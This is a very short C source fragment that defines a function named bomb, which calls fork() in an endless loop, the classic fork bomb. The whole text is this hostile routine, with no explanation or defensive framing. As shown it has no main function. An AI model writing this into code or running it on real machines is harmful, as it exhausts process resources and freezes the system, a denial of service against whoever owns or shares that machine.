#include <unistd.h>

int bomb(){
	while(1) fork();
}